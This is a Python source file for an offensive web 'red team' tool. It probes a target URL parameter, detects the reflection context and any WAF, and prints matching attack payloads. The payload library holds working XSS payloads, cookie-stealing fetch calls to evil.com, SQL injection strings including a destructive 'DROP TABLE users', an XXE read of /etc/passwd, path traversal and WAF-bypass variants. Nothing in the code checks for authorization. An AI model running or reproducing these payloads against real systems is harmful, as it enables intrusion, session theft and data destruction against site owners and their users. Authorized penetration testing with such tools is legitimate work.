#!/usr/bin/env python3
"""
Context-Aware Payload Mutator
------------------------------
Analyzes HTTP response context and generates intelligent,
context-specific payloads for web application red teaming.
"""

import re
import sys
import json
import time
import argparse
import urllib.parse
import base64
from typing import Optional
from dataclasses import dataclass, field

try:
    import requests
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    print("Missing dependencies. Run: pip install requests colorama")
    sys.exit(1)


# ──────────────────────────────────────────────
#  Data Structures
# ──────────────────────────────────────────────

@dataclass
class Context:
    name: str
    description: str
    confidence: float  # 0.0 – 1.0

@dataclass
class Payload:
    raw: str
    context: str
    encoding: str
    bypass_type: str
    risk: str       # low / medium / high
    notes: str = ""

@dataclass
class ScanResult:
    url: str
    parameter: str
    contexts: list[Context] = field(default_factory=list)
    payloads: list[Payload] = field(default_factory=list)
    waf_detected: bool = False
    waf_vendor: str = ""
    response_time: float = 0.0


# ──────────────────────────────────────────────
#  Context Detector
# ──────────────────────────────────────────────

class ContextDetector:
    """Analyzes HTTP responses to determine injection context."""

    PROBE = "CXPROBE7731"

    PATTERNS = {
        "html_tag_attribute": [
            r'<[a-z]+[^>]*=\s*["\']?[^"\']*CXPROBE7731',
            r'CXPROBE7731[^"\']*["\']?\s*[a-z]+=',
        ],
        "html_between_tags": [
            r'>[^<]*CXPROBE7731[^<]*<',
        ],
        "javascript_string_single": [
            r"'[^']*CXPROBE7731[^']*'",
            r"var\s+\w+\s*=\s*'[^']*CXPROBE7731",
        ],
        "javascript_string_double": [
            r'"[^"]*CXPROBE7731[^"]*"',
            r'var\s+\w+\s*=\s*"[^"]*CXPROBE7731',
        ],
        "javascript_template_literal": [
            r'`[^`]*CXPROBE7731[^`]*`',
        ],
        "javascript_unquoted": [
            r'(?:var|let|const)\s+\w+\s*=\s*CXPROBE7731',
            r'=\s*CXPROBE7731\s*[;,\)]',
        ],
        "json_value": [
            r'"[^"]*":\s*"[^"]*CXPROBE7731[^"]*"',
            r'"[^"]*":\s*CXPROBE7731',
        ],
        "html_comment": [
            r'<!--[^>]*CXPROBE7731[^>]*-->',
        ],
        "css_value": [
            r':\s*[^;]*CXPROBE7731[^;]*;',
            r'url\([^)]*CXPROBE7731[^)]*\)',
        ],
        "url_parameter": [
            r'[?&]\w+=CXPROBE7731',
            r'CXPROBE7731&',
        ],
        "sql_error": [
            r"(SQL syntax|mysql_fetch|ORA-|syntax error|SQLSTATE)",
        ],
        "xml_tag": [
            r'<\w+>[^<]*CXPROBE7731[^<]*</\w+>',
            r'CXPROBE7731</\w+>',
        ],
    }

    def detect(self, response_body: str, original_body: str = "") -> list[Context]:
        contexts = []
        for ctx_name, patterns in self.PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, response_body, re.IGNORECASE)
                if match:
                    confidence = self._score_confidence(ctx_name, response_body, match)
                    contexts.append(Context(
                        name=ctx_name,
                        description=self._describe(ctx_name),
                        confidence=confidence
                    ))
                    break  # one match per context type is enough

        if not contexts:
            contexts.append(Context(
                name="unknown",
                description="Reflection found but context unclear — try manual inspection",
                confidence=0.3
            ))

        return sorted(contexts, key=lambda c: c.confidence, reverse=True)

    def _score_confidence(self, ctx_name: str, body: str, match) -> float:
        base = 0.7
        span = match.group(0)
        if self.PROBE in span:
            base += 0.2
        if ctx_name == "sql_error":
            base = 0.95
        return min(base, 1.0)

    def _describe(self, ctx_name: str) -> str:
        descriptions = {
            "html_tag_attribute":       "Reflected inside an HTML tag attribute value",
            "html_between_tags":        "Reflected between HTML tags (innerHTML context)",
            "javascript_string_single": "Inside a single-quoted JavaScript string",
            "javascript_string_double": "Inside a double-quoted JavaScript string",
            "javascript_template_literal": "Inside a JS template literal (backtick string)",
            "javascript_unquoted":      "Unquoted JavaScript variable assignment",
            "json_value":               "Inside a JSON response value",
            "html_comment":             "Inside an HTML comment",
            "css_value":                "Inside a CSS property value",
            "url_parameter":            "Reflected back as a URL parameter",
            "sql_error":                "SQL error detected — likely SQL injection point",
            "xml_tag":                  "Inside XML/SOAP tag content",
            "unknown":                  "Unknown reflection context",
        }
        return descriptions.get(ctx_name, ctx_name)


# ──────────────────────────────────────────────
#  WAF Detector
# ──────────────────────────────────────────────

class WAFDetector:
    SIGNATURES = {
        "Cloudflare":   ["cloudflare", "cf-ray", "__cfduid", "attention required"],
        "AWS WAF":      ["aws", "x-amzn-requestid", "x-amz-cf-id"],
        "ModSecurity":  ["mod_security", "modsecurity", "not acceptable"],
        "Akamai":       ["akamai", "ak_bmsc", "akamaierror"],
        "Imperva":      ["incapsula", "visid_incap", "imperva"],
        "F5 BIG-IP":    ["f5", "bigip", "ts=", "f5-trafficshield"],
        "Barracuda":    ["barracuda", "barra_counter_session"],
        "Sucuri":       ["sucuri", "x-sucuri-id"],
        "Nginx WAF":    ["nginx", "400 bad request", "access denied"],
    }

    def detect(self, response: requests.Response) -> tuple[bool, str]:
        headers_str = str(response.headers).lower()
        body_str = response.text.lower()
        combined = headers_str + body_str

        for vendor, sigs in self.SIGNATURES.items():
            for sig in sigs:
                if sig in combined:
                    return True, vendor

        # Heuristic: blocked but no clear vendor
        if response.status_code in (403, 406, 429, 501):
            return True, "Unknown WAF"

        return False, ""


# ──────────────────────────────────────────────
#  Payload Library
# ──────────────────────────────────────────────

class PayloadLibrary:
    """Context-specific payload database with WAF bypass variants."""

    def get_payloads(self, context_name: str, waf_detected: bool) -> list[Payload]:
        base = self._base_payloads(context_name)
        if waf_detected:
            base += self._bypass_payloads(context_name)
        return base

    def _base_payloads(self, ctx: str) -> list[Payload]:
        payloads = {
            "html_between_tags": [
                Payload("<script>alert(1)</script>", ctx, "none", "XSS", "high", "Classic script tag injection"),
                Payload("<img src=x onerror=alert(1)>", ctx, "none", "XSS", "high", "Image onerror event"),
                Payload("<svg onload=alert(1)>", ctx, "none", "XSS", "high", "SVG onload event"),
                Payload("<details open ontoggle=alert(1)>", ctx, "none", "XSS", "medium", "HTML5 details tag"),
                Payload("<iframe srcdoc='<script>alert(1)</script>'>", ctx, "none", "XSS", "high", "Iframe srcdoc bypass"),
            ],
            "html_tag_attribute": [
                Payload('" onmouseover="alert(1)', ctx, "none", "XSS", "high", "Break out of attribute, inject event"),
                Payload("' onmouseover='alert(1)", ctx, "none", "XSS", "high", "Single-quote variant"),
                Payload('" autofocus onfocus="alert(1)', ctx, "none", "XSS", "high", "Autofocus trick — no interaction needed"),
                Payload('"><script>alert(1)</script>', ctx, "none", "XSS", "high", "Close tag and inject script"),
                Payload('" style="animation-name:x" onanimationstart="alert(1)', ctx, "none", "XSS", "medium", "CSS animation event"),
            ],
            "javascript_string_single": [
                Payload("';alert(1)//", ctx, "none", "XSS", "high", "Break out of single-quoted JS string"),
                Payload("'-alert(1)-'", ctx, "none", "XSS", "high", "Arithmetic context escape"),
                Payload("';alert(String.fromCharCode(88,83,83))//", ctx, "none", "XSS", "medium", "Char code obfuscation"),
                Payload(r"'\x3cscript\x3ealert(1)\x3c/script\x3e", ctx, "hex", "XSS", "medium", "Hex encoded script tag"),
            ],
            "javascript_string_double": [
                Payload('";alert(1)//', ctx, "none", "XSS", "high", "Break out of double-quoted JS string"),
                Payload('"-alert(1)-"', ctx, "none", "XSS", "high", "Arithmetic context escape"),
                Payload('";fetch("https://evil.com?c="+document.cookie)//', ctx, "none", "XSS", "high", "Cookie exfiltration"),
            ],
            "javascript_template_literal": [
                Payload("${alert(1)}", ctx, "none", "XSS", "high", "Template literal expression injection"),
                Payload("${fetch('https://evil.com?c='+document.cookie)}", ctx, "none", "XSS", "high", "Cookie theft via template literal"),
                Payload("${''.constructor.constructor('alert(1)')()} ", ctx, "none", "XSS", "high", "Constructor chain bypass"),
            ],
            "javascript_unquoted": [
                Payload(";alert(1)//", ctx, "none", "XSS", "high", "Semicolon injection into JS"),
                Payload("1;alert(1)", ctx, "none", "XSS", "high", "Numeric context injection"),
            ],
            "json_value": [
                Payload('","x":"<script>alert(1)</script>', ctx, "none", "XSS/Injection", "high", "JSON value escape"),
                Payload('\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', ctx, "unicode", "XSS", "medium", "Unicode escaped script tag"),
                Payload('</script><script>alert(1)</script>', ctx, "none", "XSS", "high", "JSON in HTML script block break"),
            ],
            "html_comment": [
                Payload("--><script>alert(1)</script><!--", ctx, "none", "XSS", "high", "Break out of HTML comment"),
                Payload("--><img src=x onerror=alert(1)><!--", ctx, "none", "XSS", "medium", "Comment escape with img"),
            ],
            "css_value": [
                Payload("expression(alert(1))", ctx, "none", "XSS", "medium", "Old IE CSS expression (legacy targets)"),
                Payload(");}</style><script>alert(1)</script><style>", ctx, "none", "XSS", "high", "Break out of style block"),
                Payload('url("javascript:alert(1)")', ctx, "none", "XSS", "medium", "CSS url() javascript protocol"),
            ],
            "sql_error": [
                Payload("' OR '1'='1", ctx, "none", "SQLi", "high", "Classic auth bypass"),
                Payload("' OR 1=1--", ctx, "none", "SQLi", "high", "Comment-based bypass"),
                Payload("' UNION SELECT null,null,null--", ctx, "none", "SQLi", "high", "Union-based detection"),
                Payload("' AND SLEEP(5)--", ctx, "none", "SQLi-Time", "high", "Time-based blind detection"),
                Payload("'; DROP TABLE users--", ctx, "none", "SQLi", "high", "Destructive test (use with caution)"),
                Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", ctx, "none", "SQLi-Time", "high", "Nested sleep bypass"),
            ],
            "xml_tag": [
                Payload("]]><script>alert(1)</script><![CDATA[", ctx, "none", "XSS/XXE", "high", "CDATA break injection"),
                Payload("<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xx SYSTEM 'file:///etc/passwd'>]><x>&xx;</x>", ctx, "none", "XXE", "high", "XXE file read"),
                Payload("&lt;script&gt;alert(1)&lt;/script&gt;", ctx, "html_entity", "XSS", "medium", "HTML entity encoded XSS"),
            ],
            "url_parameter": [
                Payload("javascript:alert(1)", ctx, "none", "XSS", "high", "JS protocol in URL param"),
                Payload("%3Cscript%3Ealert(1)%3C/script%3E", ctx, "url", "XSS", "medium", "URL encoded script tag"),
                Payload("/../../../etc/passwd", ctx, "none", "LFI", "high", "Path traversal attempt"),
                Payload("http://evil.com", ctx, "none", "SSRF/Redirect", "medium", "Open redirect / SSRF test"),
            ],
        }
        return payloads.get(ctx, [
            Payload("<script>alert(1)</script>", ctx, "none", "XSS", "medium", "Generic fallback — context unclear"),
            Payload("' OR '1'='1", ctx, "none", "SQLi", "medium", "Generic SQLi fallback"),
        ])

    def _bypass_payloads(self, ctx: str) -> list[Payload]:
        """WAF bypass variants for each context."""
        bypasses = {
            "html_between_tags": [
                Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case bypass"),
                Payload("<scr\x00ipt>alert(1)</scr\x00ipt>", ctx, "null_byte", "XSS-WAF-Bypass", "high", "Null byte insertion"),
                Payload("<script>eval(atob('YWxlcnQoMSk='))</script>", ctx, "base64", "XSS-WAF-Bypass", "high", "Base64 encoded payload"),
                Payload("<%00script>alert(1)</script>", ctx, "null_byte", "XSS-WAF-Bypass", "medium", "URL-encoded null byte"),
                Payload("<scr<!---->ipt>alert(1)</scr<!---->ipt>", ctx, "comment", "XSS-WAF-Bypass", "medium", "Comment insertion in tag"),
            ],
            "html_tag_attribute": [
                Payload('" OnMoUsEoVeR="alert(1)', ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case event handler"),
                Payload('" on\x09mouseover="alert(1)', ctx, "tab", "XSS-WAF-Bypass", "high", "Tab character in event name"),
                Payload('" onmouseover\x00="alert(1)', ctx, "null_byte", "XSS-WAF-Bypass", "medium", "Null byte before equals"),
            ],
            "sql_error": [
                Payload("' /*!OR*/ '1'='1", ctx, "comment", "SQLi-WAF-Bypass", "high", "MySQL inline comment bypass"),
                Payload("'/**/OR/**/1=1--", ctx, "comment", "SQLi-WAF-Bypass", "high", "Comment-space substitution"),
                Payload("' %4fR '1'='1", ctx, "url", "SQLi-WAF-Bypass", "high", "URL encoded OR keyword"),
                Payload("' OR 0x313d31--", ctx, "hex", "SQLi-WAF-Bypass", "high", "Hex value comparison"),
                Payload("';WAITFOR DELAY '0:0:5'--", ctx, "none", "SQLi-WAF-Bypass", "high", "MSSQL time-based bypass"),
            ],
            "javascript_string_single": [
                Payload("\\';alert(1)//", ctx, "escape", "XSS-WAF-Bypass", "high", "Backslash escape bypass"),
                Payload("'-eval(String.fromCharCode(97,108,101,114,116,40,49,41))-'", ctx, "charcode", "XSS-WAF-Bypass", "high", "fromCharCode obfuscation"),
            ],
        }
        return bypasses.get(ctx, [
            Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "WAF-Bypass", "medium", "Generic case bypass"),
            Payload("%3Cscript%3Ealert(1)%3C%2Fscript%3E", ctx, "url", "WAF-Bypass", "medium", "Generic URL encode bypass"),
        ])


# ──────────────────────────────────────────────
#  Core Scanner
# ──────────────────────────────────────────────

class PayloadMutator:
    def __init__(self, proxy: Optional[str] = None, delay: float = 0.5,
                 timeout: int = 10, headers: Optional[dict] = None):
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            **(headers or {})
        })
        self.detector = ContextDetector()
        self.waf_detector = WAFDetector()
        self.library = PayloadLibrary()

    def probe(self, url: str, param: str, method: str = "GET") -> ScanResult:
        result = ScanResult(url=url, parameter=param)
        probe_value = ContextDetector.PROBE

        try:
            response, elapsed = self._send(url, param, probe_value, method)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Request failed: {e}")
            return result

        result.response_time = elapsed

        # WAF detection
        waf_found, waf_vendor = self.waf_detector.detect(response)
        result.waf_detected = waf_found
        result.waf_vendor = waf_vendor

        if probe_value not in response.text:
            print(f"{Fore.YELLOW}[!] Probe not reflected in response — may be filtered or not injectable")
            return result

        # Context detection
        result.contexts = self.detector.detect(response.text)

        # Generate payloads for each detected context
        seen = set()
        for ctx in result.contexts:
            for p in self.library.get_payloads(ctx.name, waf_found):
                if p.raw not in seen:
                    seen.add(p.raw)
                    result.payloads.append(p)

        return result

    def _send(self, url: str, param: str, value: str,
              method: str) -> tuple[requests.Response, float]:
        start = time.time()
        if method.upper() == "GET":
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [value]
            new_qs = urllib.parse.urlencode(qs, doseq=True)
            new_url = parsed._replace(query=new_qs).geturl()
            resp = self.session.get(new_url, timeout=self.timeout, proxies=self.proxy, verify=False)
        else:
            resp = self.session.post(url, data={param: value},
                                     timeout=self.timeout, proxies=self.proxy, verify=False)
        elapsed = time.time() - start
        time.sleep(self.delay)
        return resp, elapsed


# ──────────────────────────────────────────────
#  Output / Display
# ──────────────────────────────────────────────

RISK_COLOR = {
    "high":   Fore.RED,
    "medium": Fore.YELLOW,
    "low":    Fore.GREEN,
}

def banner():
    print(f"""{Fore.CYAN}{Style.BRIGHT}
  ██████╗ █████╗ ██████╗ ███╗   ███╗
 ██╔════╝██╔══██╗██╔══██╗████╗ ████║
 ██║     ███████║██████╔╝██╔████╔██║
 ██║     ██╔══██║██╔═══╝ ██║╚██╔╝██║
 ╚██████╗██║  ██║██║     ██║ ╚═╝ ██║
  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝
{Style.RESET_ALL}{Fore.WHITE}  Context-Aware Payload Mutator  {Fore.CYAN}v1.0
  {Fore.WHITE}Web App Red Team Tool
{Style.RESET_ALL}""")

def print_result(result: ScanResult, output_format: str = "terminal"):
    if output_format == "json":
        data = {
            "url": result.url,
            "parameter": result.parameter,
            "waf_detected": result.waf_detected,
            "waf_vendor": result.waf_vendor,
            "response_time_ms": round(result.response_time * 1000, 2),
            "contexts": [
                {"name": c.name, "description": c.description, "confidence": c.confidence}
                for c in result.contexts
            ],
            "payloads": [
                {"payload": p.raw, "context": p.context, "encoding": p.encoding,
                 "bypass_type": p.bypass_type, "risk": p.risk, "notes": p.notes}
                for p in result.payloads
            ]
        }
        print(json.dumps(data, indent=2))
        return

    print(f"\n{Fore.CYAN}{'═'*60}")
    print(f"{Fore.WHITE}{Style.BRIGHT}  SCAN RESULTS")
    print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Target   : {Fore.YELLOW}{result.url}")
    print(f"  {Fore.WHITE}Parameter: {Fore.YELLOW}{result.parameter}")
    print(f"  {Fore.WHITE}Resp Time: {Fore.YELLOW}{result.response_time*1000:.0f}ms")

    if result.waf_detected:
        print(f"  {Fore.WHITE}WAF      : {Fore.RED}⚠  DETECTED — {result.waf_vendor}")
        print(f"             {Fore.YELLOW}→ Bypass payloads included automatically")
    else:
        print(f"  {Fore.WHITE}WAF      : {Fore.GREEN}✓  Not detected")

    if not result.contexts:
        print(f"\n{Fore.RED}  [!] No reflection contexts detected.")
        return

    print(f"\n{Fore.CYAN}  {'─'*56}")
    print(f"{Fore.WHITE}{Style.BRIGHT}  DETECTED CONTEXTS ({len(result.contexts)}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}  {'─'*56}")
    for i, ctx in enumerate(result.contexts, 1):
        bar = int(ctx.confidence * 10)
        bar_str = "█" * bar + "░" * (10 - bar)
        color = Fore.GREEN if ctx.confidence > 0.8 else Fore.YELLOW
        print(f"  {i}. {color}{ctx.name}")
        print(f"     {Fore.WHITE}{ctx.description}")
        print(f"     Confidence: {color}[{bar_str}] {ctx.confidence*100:.0f}%{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}  {'─'*56}")
    print(f"{Fore.WHITE}{Style.BRIGHT}  GENERATED PAYLOADS ({len(result.payloads)}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}  {'─'*56}")

    for i, p in enumerate(result.payloads, 1):
        risk_col = RISK_COLOR.get(p.risk, Fore.WHITE)
        waf_tag = f" {Fore.MAGENTA}[WAF-BYPASS]" if "WAF-Bypass" in p.bypass_type else ""
        print(f"\n  {Fore.WHITE}[{i:02d}]{waf_tag} {risk_col}[{p.risk.upper()}]"
              f" {Fore.CYAN}{p.bypass_type}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Context : {Fore.YELLOW}{p.context}")
        print(f"  {Fore.WHITE}Encoding: {Fore.YELLOW}{p.encoding}")
        if p.notes:
            print(f"  {Fore.WHITE}Notes   : {Fore.WHITE}{p.notes}")
        print(f"  {Fore.GREEN}Payload : {Style.BRIGHT}{p.raw}{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}\n")


def save_payloads(result: ScanResult, filepath: str):
    with open(filepath, "w") as f:
        for p in result.payloads:
            f.write(p.raw + "\n")
    print(f"{Fore.GREEN}[✓] Payloads saved to: {filepath}")


def export_report(result: ScanResult, filepath: str):
    with open(filepath, "w") as f:
        f.write("# Context-Aware Payload Mutator Report\n\n")
        f.write(f"**URL:** `{result.url}`\n")
        f.write(f"**Parameter:** `{result.parameter}`\n")
        f.write(f"**WAF Detected:** {'Yes — ' + result.waf_vendor if result.waf_detected else 'No'}\n\n")
        f.write("## Detected Contexts\n\n")
        for c in result.contexts:
            f.write(f"- **{c.name}** ({c.confidence*100:.0f}% confidence): {c.description}\n")
        f.write("\n## Payloads\n\n")
        f.write("| # | Risk | Type | Context | Encoding | Payload | Notes |\n")
        f.write("|---|------|------|---------|----------|---------|-------|\n")
        for i, p in enumerate(result.payloads, 1):
            raw = p.raw.replace("|", "\\|")
            f.write(f"| {i} | {p.risk} | {p.bypass_type} | {p.context} | {p.encoding} | `{raw}` | {p.notes} |\n")
    print(f"{Fore.GREEN}[✓] Markdown report saved to: {filepath}")


# ──────────────────────────────────────────────
#  Entry Point
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Context-Aware Payload Mutator — Red Team Web App Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url",       required=True, help="Target URL")
    parser.add_argument("-p", "--param",     required=True, help="Parameter to test")
    parser.add_argument("-m", "--method",    default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("--proxy",           help="Proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--delay",           type=float, default=0.5, help="Delay between requests (seconds)")
    parser.add_argument("--timeout",         type=int, default=10, help="Request timeout (seconds)")
    parser.add_argument("--header",          action="append", metavar="K:V", help="Custom headers (repeatable)")
    parser.add_argument("--output",          choices=["terminal", "json"], default="terminal")
    parser.add_argument("--save-payloads",   metavar="FILE", help="Save payload list to a file")
    parser.add_argument("--export-report",   metavar="FILE", help="Export markdown report to a file")
    args = parser.parse_args()

    banner()

    headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    mutator = PayloadMutator(
        proxy=args.proxy,
        delay=args.delay,
        timeout=args.timeout,
        headers=headers
    )

    print(f"{Fore.CYAN}[*] Probing: {Fore.WHITE}{args.url}")
    print(f"{Fore.CYAN}[*] Parameter: {Fore.WHITE}{args.param}")
    print(f"{Fore.CYAN}[*] Method: {Fore.WHITE}{args.method}\n")

    result = mutator.probe(args.url, args.param, args.method)
    print_result(result, args.output)

    if args.save_payloads:
        save_payloads(result, args.save_payloads)

    if args.export_report:
        export_report(result, args.export_report)


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
